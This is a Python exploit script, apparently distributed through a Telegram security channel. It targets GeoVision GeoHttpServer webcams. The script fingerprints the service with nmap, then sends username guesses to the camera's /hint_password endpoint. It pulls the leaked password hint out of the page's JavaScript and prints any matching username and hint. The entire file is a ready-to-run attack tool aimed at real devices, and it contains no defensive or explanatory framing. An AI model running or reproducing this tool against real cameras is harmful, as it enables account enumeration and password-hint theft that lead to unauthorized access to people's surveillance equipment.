# Coded By E | L F
from colorama import init , Fore
import nmap
import requests
import re
import argparse

init()

class Exploit():
    def __init__(self, ip, port, load_user_list=None) -> None:
        self.ip = ip
        self.port = port
        if load_user_list is None:
            self.users = ['admin', 'root']
        else:
            self.users = self.load_user(load_user_list).split("\n")
        print(f"{Fore.CYAN}INFO {Fore.YELLOW}:{Fore.WHITE} loaded {Fore.MAGENTA}{len(self.users)}{Fore.WHITE} username for checker ")

    def checker(self):
        nm = nmap.PortScanner()
        nm.scan(self.ip, self.port, '-Pn -sV')
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for port in lport:
                    service_name = nm[host][proto][port]['product']
                    if service_name == "GeoVision GeoHttpServer for webcams":
                        return True
        return False

    def extract_hint(self, js_code):
        pattern = r"var\s+hint\s*=\s*(['\"])(.*?)\1;"
        match = re.search(pattern, js_code)
        if match:
            return match.group(2)
        return None

    def load_user(self, path_file):
        with open(path_file, 'r') as file:
            data = file.read()
            return data

    def return_hint(self):
        for user in self.users:
            print(f"{Fore.CYAN}INFO {Fore.YELLOW}: {Fore.MAGENTA}tested user --> {Fore.WHITE}{user}")
            respones = requests.post(
                url="http://" + self.ip + ":" + self.port + "/hint_password",
                data={
                    "id": user,
                    "OK": "OK"
                }
            )
            result = self.extract_hint(respones.text)
            if result != "No such id":
                return result , user
        else:
            return False


if __name__ == "__main__":
    print(f"{Fore.GREEN}Telegram Channel {Fore.YELLOW}:{Fore.WHITE} @ELF_SECURITY_CYBER\n{Fore.GREEN}Telegram Username {Fore.YELLOW}:{Fore.WHITE} @E_L_F_6_6_6")
    parser = argparse.ArgumentParser(description='Vulnerability GeoVision GeoHttpServer')
    parser.add_argument('ip', help='IP address of the target')
    parser.add_argument('port', help='Port number of the target')
    parser.add_argument('-u', '--user-list', help='Path to the user list file' , default=None)
    args = parser.parse_args()
    ip_address = args.ip
    port = args.port
    user_list_file = args.user_list

    app = Exploit(ip_address, port, user_list_file)
    print(f"{Fore.CYAN}INFO{Fore.YELLOW} :{Fore.WHITE} running scanner")
    result_check = app.checker()
    if result_check == True:    
        print(f"{Fore.GREEN}SUCSESS{Fore.YELLOW}: {Fore.WHITE} Vulnerability detected")
        print(f"{Fore.CYAN}INFO {Fore.YELLOW}: {Fore.WHITE} running username and hint finder")
        result = app.return_hint()        
        if result != False:
            print(f"{Fore.GREEN} USERNAME{Fore.YELLOW} :{Fore.WHITE} {result[1]} \n {Fore.GREEN}HINT {Fore.YELLOW}:{Fore.WHITE} {result[0]} ")
        else:
            print(f"{Fore.RED}ERROR{Fore.YELLOW} :{Fore.WHITE} not found hint")
    else:
        print(f"{Fore.RED}ERROR{Fore.YELLOW} :{Fore.WHITE} This vulnerability is not for this type of camera ")
